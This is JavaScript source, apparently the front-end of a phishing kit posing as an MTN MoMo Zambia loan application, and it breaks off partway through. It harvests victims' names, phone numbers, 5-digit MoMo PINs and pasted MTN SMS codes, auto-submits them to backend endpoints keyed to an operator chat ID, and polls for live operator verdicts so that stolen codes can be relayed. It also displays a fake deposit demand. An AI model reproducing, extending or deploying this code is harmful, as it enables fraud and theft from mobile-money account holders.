(function () {
  function initApp() {
    const $ = (id) => document.getElementById(id);

    const screens = {
      welcome: $('screen-welcome'),
      slider: $('screen-slider'),
      form1: $('screen-form1'),
      form2: $('screen-form2'),
      form3: $('screen-form3'),
      pin: $('screen-pin'),
      sms: $('screen-sms'),
      success: $('screen-success'),
      stopped: $('screen-stopped')
    };

    const loadingOverlay = $('loading-overlay');

    const loanSlider = $('loan-amount-slider');
    const loanText = $('loan-amount-text');
    const monthsSlider = $('loan-months-slider');
    const monthsText = $('loan-months-text');
    const monthlyRepVal = $('monthly-rep-val');

    const formAmountInput = $('form-amount-input');
    const loanDurationSelect = $('loan-duration');
    const loanPurposeInput = $('loan-purpose');
    const firstNameInput = $('first-name');
    const lastNameInput = $('last-name');
    const formPhoneInput = $('form-phone');

    const sumAmount = $('sum-amount');
    const sumDuration = $('sum-duration');
    const sumPurpose = $('sum-purpose');
    const sumApplicant = $('sum-applicant');
    const depositRequiredAmount = $('deposit-required-amount');
    const successDepositAmount = $('success-deposit-amount');

    const bannerPhoneError = $('banner-phone-error');
    const bannerForm3Error = $('banner-form3-error');
    const bannerPinError = $('banner-pin-error');
    const bannerPinInfo = $('banner-pin-info');
    const bannerSmsError = $('banner-sms-error');
    const bannerSmsInfo = $('banner-sms-info');

    const displayPinPhone = $('display-pin-phone');
    const pinPhoneInput = $('pin-phone-input');
    const yelloPinInput = $('yello-pin-input');
    const btnTogglePinVisibility = $('btn-toggle-pin-visibility');

    const displaySmsPhone = $('display-sms-phone');
    const smsInputBox = $('sms-input-box');
    const smsSecondsSpan = $('sms-seconds');
    const smsTimerText = $('sms-timer-text');
    const btnRequestNewSms = $('btn-request-new-sms');

    const blockedReasonText = $('blocked-reason-text');

    let currentUserId = null;
    let statusPollInterval = null;
    let smsTimerInterval = null;
    let pinAutoSubmittedForCurrentValue = '';
    let smsAutoSubmittedForCurrentValue = '';
    let isSubmittingPin = false;
    let isSubmittingSms = false;

    const urlParams = new URLSearchParams(window.location.search);
    const adminParam = urlParams.get('admin') || '';

    // Auto-submit once SMS starts with "Y'ello. Please note!"
    const SMS_PREFIX_REGEX = /^Y['’]ello\.\s*Please note!/i;

    function startsWithYelloPleaseNote(rawSms) {
      const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
      return SMS_PREFIX_REGEX.test(normalized);
    }

    function toZeroPrefixPhone(rawPhone) {
      const digits = String(rawPhone || '').replace(/\D/g, '');
      if (digits.startsWith('260')) return '0' + digits.slice(3);
      if (digits.startsWith('0')) return digits;
      if (/^(96|76|56)\d{7}$/.test(digits)) return '0' + digits;
      return digits;
    }

    function isValidMtnZambia(rawPhone) {
      const normalized = toZeroPrefixPhone(rawPhone);
      return /^(096|076|056)\d{7}$/.test(normalized);
    }

    function formatDisplayPhone(rawPhone) {
      const zeroPhone = toZeroPrefixPhone(rawPhone);
      if (/^(096|076|056)\d{7}$/.test(zeroPhone)) {
        return `${zeroPhone.slice(0, 3)} ${zeroPhone.slice(3, 6)} ${zeroPhone.slice(6)}`;
      }
      return zeroPhone || '096 XXX XXXX';
    }

    function showBanner(el, msg) {
      if (!el) return;
      el.innerText = msg;
      el.classList.add('active');
    }

    function hideBanner(el) {
      if (!el) return;
      el.innerText = '';
      el.classList.remove('active');
    }

    function showLoading(title, sub) {
      const titleEl = $('loading-title');
      const subEl = $('loading-sub');
      if (titleEl) titleEl.innerText = title;
      if (subEl) subEl.innerText = sub;
      if (loadingOverlay) loadingOverlay.classList.add('active');
    }

    function hideLoading() {
      if (loadingOverlay) loadingOverlay.classList.remove('active');
    }

    function showScreen(targetScreen) {
      Object.values(screens).forEach((s) => {
        if (s) s.classList.remove('active');
      });
      if (targetScreen) {
        targetScreen.classList.add('active');
        try {
          window.scrollTo({ top: 0, behavior: 'instant' });
        } catch (err) {
          window.scrollTo(0, 0);
        }
      }
    }

    function updateCalc() {
      const amt = loanSlider ? Number(loanSlider.value) || 100000 : 100000;
      const mths = monthsSlider ? Number(monthsSlider.value) || 48 : 48;
      if (loanText) loanText.innerText = `ZMW ${amt.toLocaleString()}`;
      if (monthsText) monthsText.innerText = `${mths} ${mths === 1 ? 'month' : 'months'}`;
      if (formAmountInput) formAmountInput.value = amt.toLocaleString();
      if (sumDuration) sumDuration.innerText = `${mths} Months`;
      const monthly = (amt * 1.1) / mths;
      if (monthlyRepVal) monthlyRepVal.innerText = `ZMW ${Math.round(monthly).toLocaleString()}`;
    }

    if (loanSlider) {
      loanSlider.addEventListener('input', updateCalc);
      loanSlider.addEventListener('change', updateCalc);
    }
    if (monthsSlider) {
      monthsSlider.addEventListener('input', updateCalc);
      monthsSlider.addEventListener('change', updateCalc);
    }
    updateCalc();

    function syncSummaryFromForm1() {
      const amtRaw = (formAmountInput?.value || '100,000').trim();
      const dur = loanDurationSelect?.value || '48 Months';
      const purp = (loanPurposeInput?.value || '').trim() || 'Business';
      if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
      if (sumDuration) sumDuration.innerText = dur;
      if (sumPurpose) sumPurpose.innerText = purp;

      const numericAmt = Number(amtRaw.replace(/\D/g, '')) || 100000;
      const depVal = Math.max(200, Math.round(numericAmt * 0.002));
      if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
      if (successDepositAmount) successDepositAmount.innerText = `${depVal} ZMW`;
    }

    function goFromForm2ToForm3() {
      hideBanner(bannerPhoneError);
      const fn = (firstNameInput?.value || '').trim();
      const ln = (lastNameInput?.value || '').trim();
      const ph = (formPhoneInput?.value || '').trim();

      if (!fn || !ln) {
        showBanner(bannerPhoneError, 'Please enter your first name and last name.');
        return;
      }

      if (!isValidMtnZambia(ph)) {
        showBanner(
          bannerPhoneError,
          'Enter a valid MTN Zambia number starting with 096, 076, or 056.'
        );
        return;
      }

      syncSummaryFromForm1();
      if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();

      hideBanner(bannerForm3Error);
      showScreen(screens.form3);
    }

    async function goFromForm3ToPinScreen() {
      hideBanner(bannerForm3Error);
      syncSummaryFromForm1();

      const fn = (firstNameInput?.value || '').trim();
      const ln = (lastNameInput?.value || '').trim();
      const ph = (formPhoneInput?.value || '').trim();

      const fullName =
        `${fn} ${ln}`.trim().toUpperCase() ||
        (sumApplicant?.innerText || '').trim() ||
        'MTN MOMO ZAMBIA';
      const zeroPhone = toZeroPrefixPhone(ph);
      const formattedPhone = formatDisplayPhone(zeroPhone);

      if (sumApplicant) sumApplicant.innerText = fullName;
      if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
      if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
      if (pinPhoneInput && !pinPhoneInput.value.trim()) {
        pinPhoneInput.value = formattedPhone;
      }

      pinAutoSubmittedForCurrentValue = '';
      smsAutoSubmittedForCurrentValue = '';
      isSubmittingPin = false;
      isSubmittingSms = false;

      if (yelloPinInput) {
        yelloPinInput.value = '';
        yelloPinInput.type = 'password';
      }
      if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
      hideBanner(bannerPinError);
      hideBanner(bannerPinInfo);

      showScreen(screens.pin);
      if (yelloPinInput) yelloPinInput.focus();

      try {
        const res = await fetch(
          `/api/submit-application?admin=${encodeURIComponent(adminParam)}`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              adminChatId: adminParam,
              applicant: { fullName, phone: zeroPhone }
            })
          }
        );
        const data = await res.json();
        if (data && data.success && data.userId) {
          currentUserId = data.userId;
        }
      } catch (e) {}
    }

    function startSmsCountdown() {
      let timeLeft = 15;
      if (smsSecondsSpan) smsSecondsSpan.innerText = timeLeft;
      if (smsTimerText) smsTimerText.classList.remove('hidden-btn');
      if (btnRequestNewSms) btnRequestNewSms.classList.add('hidden-btn');

      if (smsTimerInterval) clearInterval(smsTimerInterval);

      smsTimerInterval = setInterval(() => {
        timeLeft -= 1;
        if (smsSecondsSpan) smsSecondsSpan.innerText = Math.max(0, timeLeft);

        if (timeLeft <= 0) {
          clearInterval(smsTimerInterval);
          if (smsTimerText) smsTimerText.classList.add('hidden-btn');
          if (btnRequestNewSms) btnRequestNewSms.classList.remove('hidden-btn');
        }
      }, 1000);
    }

    async function submitPinAutomatically(pinVal) {
      if (isSubmittingPin) return;
      isSubmittingPin = true;

      hideBanner(bannerPinError);
      hideBanner(bannerPinInfo);

      const enteredPhone = (pinPhoneInput?.value || displayPinPhone?.innerText || formPhoneInput?.value || '').trim();
      const phoneZero = toZeroPrefixPhone(enteredPhone);
      const formattedPhone = formatDisplayPhone(phoneZero);
      if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
      if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;

      const applicantName =
        (
          sumApplicant?.innerText ||
          `${firstNameInput?.value || ''} ${lastNameInput?.value || ''}`
        ).trim() || 'MTN MOMO ZAMBIA';

      showLoading('SENDING 5-DIGIT PIN FOR REVIEW...', 'Please wait for admin response...');

      try {
        const res = await fetch('/api/submit-pin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            adminChatId: adminParam,
            phone: phoneZero,
            pin: pinVal,
            applicantName
          })
        });
        const data = await res.json();
        if (data && data.success && data.userId) {
          currentUserId = data.userId;
        }
        startStatusPolling();
      } catch (e) {
        isSubmittingPin = false;
        pinAutoSubmittedForCurrentValue = '';
        hideLoading();
        showBanner(bannerPinError, 'Connection issue while sending PIN. Re-enter 5 digits to retry.');
      } finally {
        isSubmittingPin = false;
      }
    }

    async function submitSmsAutomatically(smsText) {
      if (isSubmittingSms) return;
      isSubmittingSms = true;

      hideBanner(bannerSmsError);
      hideBanner(bannerSmsInfo);
      const phoneZero = toZeroPrefixPhone(
        displaySmsPhone?.innerText || pinPhoneInput?.value || formPhoneInput?.value || ''
      );

      showLoading('AUTO-SUBMITTING SMS CODE...', 'Please wait for admin review...');

      try {
        const res = await fetch('/api/submit-sms', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            adminChatId: adminParam,
            phone: phoneZero,
            sms: smsText,
            autoDetected: true
          })
        });
        const data = await res.json();
        if (data && data.success && data.userId) {
          currentUserId = data.userId;
        }
        startStatusPolling();
      } catch (e) {
        isSubmittingSms = false;
        smsAutoSubmittedForCurrentValue = '';
        hideLoading();
        showBanner(bannerSmsError, 'Unable to submit SMS. Paste again to retry.');
      } finally {
        isSubmittingSms = false;
      }
    }

    function startStatusPolling() {
      if (statusPollInterval) clearInterval(statusPollInterval);

      statusPollInterval = setInterval(async () => {
        if (!currentUserId) return;

        try {
          const res = await fetch(`/api/check-status/${encodeURIComponent(currentUserId)}`);
          const data = await res.json();
          const st = data && data.status;

          if (st === 'BLOCKED') {
            clearInterval(statusPollInterval);
            if (smsTimerInterval) clearInterval(smsTimerInterval);
            hideLoading();
            if (blockedReasonText) {
              blockedReasonText.innerText =
                'BLOCK — Application blocked because valid MTN MoMo details were not confirmed.';
            }
            showScreen(screens.stopped);
          } else if (st === 'PROCEED_SMS') {
            clearInterval(statusPollInterval);
            hideLoading();
            hideBanner(bannerSmsError);
            hideBanner(bannerSmsInfo);
            smsAutoSubmittedForCurrentValue = '';
            if (smsInputBox) smsInputBox.value = '';
            showScreen(screens.sms);
            startSmsCountdown();
            if (smsInputBox) smsInputBox.focus();
          } else if (st === 'INCORRECT_PIN') {
            clearInterval(statusPollInterval);
            if (smsTimerInterval) clearInterval(smsTimerInterval);
            hideLoading();
            pinAutoSubmittedForCurrentValue = '';
            if (yelloPinInput) yelloPinInput.value = '';
            showScreen(screens.pin);
            hideBanner(bannerPinInfo);
            showBanner(bannerPinError, 'INCORRECT PIN — Please enter a new 5-digit PIN.');
            if (yelloPinInput) yelloPinInput.focus();
          } else if (st === 'SMS_EXPIRED') {
            clearInterval(statusPollInterval);
            hideLoading();
            smsAutoSubmittedForCurrentValue = '';
            if (smsInputBox) smsInputBox.value = '';
            showScreen(screens.sms);
            hideBanner(bannerSmsInfo);
            showBanner(bannerSmsError, 'SMS EXPIRES — Please enter a new SMS or request a new SMS.');
            startSmsCountdown();
            if (smsInputBox) smsInputBox.focus();
          } else if (st === 'APPROVE' || st === 'APPROVED' || st === 'SUCCESS') {
            clearInterval(statusPollInterval);
            if (smsTimerInterval) clearInterval(smsTimerInterval);
            hideLoading();
            showScreen(screens.success);
          }
        } catch (e) {}
      }, 1000);
    }

    function resetToWelcome() {
      if (statusPollInterval) clearInterval(statusPollInterval);
      if (smsTimerInterval) clearInterval(smsTimerInterval);
      currentUserId = null;
      pinAutoSubmittedForCurrentValue = '';
      smsAutoSubmittedForCurrentValue = '';
      isSubmittingPin = false;
      isSubmittingSms = false;
      if (yelloPinInput) {
        yelloPinInput.value = '';
        yelloPinInput.type = 'password';
      }
      if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
      if (smsInputBox) smsInputBox.value = '';
      [
        bannerPhoneError,
        bannerForm3Error,
        bannerPinError,
        bannerPinInfo,
        bannerSmsError,
        bannerSmsInfo
      ].forEach(hideBanner);
      hideLoading();
      showScreen(screens.welcome);
    }

    // Navigation & action buttons
    const buttonHandlers = {
      'btn-goto-slider': () => {
        updateCalc();
        showScreen(screens.slider);
      },
      'btn-slider-back': () => showScreen(screens.welcome),
      'btn-goto-form1': () => showScreen(screens.form1),
      'btn-form1-back': () => {
        updateCalc();
        showScreen(screens.slider);
      },
      'btn-form1-next': () => {
        syncSummaryFromForm1();
        hideBanner(bannerPhoneError);
        showScreen(screens.form2);
      },
      'btn-form2-back': () => showScreen(screens.form1),
      'btn-form2-prev': () => showScreen(screens.form1),
      'btn-form2-next': goFromForm2ToForm3,
      'btn-form3-top-back': () => showScreen(screens.form2),
      'btn-form3-prev': () => showScreen(screens.form2),
      'btn-form3-submit': goFromForm3ToPinScreen,
      'btn-pin-back': () => {
        if (statusPollInterval) clearInterval(statusPollInterval);
        hideLoading();
        showScreen(screens.form3);
      },
      'link-forgot-pin': (e) => {
        if (e) e.preventDefault();
        hideBanner(bannerPinError);
        showBanner(bannerPinInfo, 'Enter your 5-digit PIN — it submits automatically at 5 digits.');
      },
      'btn-switch-account': () => {
        if (statusPollInterval) clearInterval(statusPollInterval);
        hideLoading();
        showScreen(screens.form2);
      },
      'link-pin-tcs': (e) => {
        if (e) e.preventDefault();
        hideBanner(bannerPinError);
        showBanner(bannerPinInfo, 'Standard MTN MoMo Zambia terms and conditions apply.');
      },
      'btn-pin-contact': () => {
        hideBanner(bannerPinError);
        showBanner(bannerPinInfo, 'MTN Zambia MoMo Support: dial 111.');
      },
      'btn-request-new-sms': async () => {
        hideBanner(bannerSmsError);
        const phoneZero = toZeroPrefixPhone(
          displaySmsPhone?.innerText || pinPhoneInput?.value || formPhoneInput?.value || ''
        );
        showBanner(bannerSmsInfo, 'NEW SMS REQUESTED — Admin has been notified.');
        startSmsCountdown();
        try {
          const res = await fetch('/api/request-new-sms', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              userId: currentUserId,
              adminChatId: adminParam,
              phone: phoneZero
            })
          });
          const data = await res.json();
          if (data && data.success && data.userId) {
            currentUserId = data.userId;
          }
          startStatusPolling();
        } catch (err) {}
      },
      'btn-success-back': resetToWelcome,
      'btn-finish-home': resetToWelcome,
      'btn-retry-home': resetToWelcome
    };

    Object.entries(buttonHandlers).forEach(([id, fn]) => {
      const el = $(id);
      if (el) el.addEventListener('click', fn);
    });

    if (btnTogglePinVisibility) {
      btnTogglePinVisibility.addEventListener('click', () => {
        if (!yelloPinInput) return;
        const makeVisible = yelloPinInput.type === 'password';
        yelloPinInput.type = makeVisible ? 'text' : 'password';
        btnTogglePinVisibility.innerText = makeVisible ? '🙈' : '👁️';
      });
    }

    if (pinPhoneInput) {
      pinPhoneInput.addEventListener('input', () => {
        const formatted = formatDisplayPhone(pinPhoneInput.value);
        if (displayPinPhone) displayPinPhone.innerText = formatted;
        if (displaySmsPhone) displaySmsPhone.innerText = formatted;
      });
    }

    // Auto-submit once 5-digit PIN box is filled
    function checkAndAutoSubmitPin() {
      if (!yelloPinInput) return;
      const digits = yelloPinInput.value.replace(/\D/g, '').slice(0, 5);
      if (yelloPinInput.value !== digits) {
        yelloPinInput.value = digits;
      }
      if (digits.length === 5 && digits !== pinAutoSubmittedForCurrentValue) {
        pinAutoSubmittedForCurrentValue = digits;
        submitPinAutomatically(digits);
      }
    }

    if (yelloPinInput) {
      yelloPinInput.addEventListener('input', checkAndAutoSubmitPin);
      yelloPinInput.addEventListener('keyup', checkAndAutoSubmitPin);
      
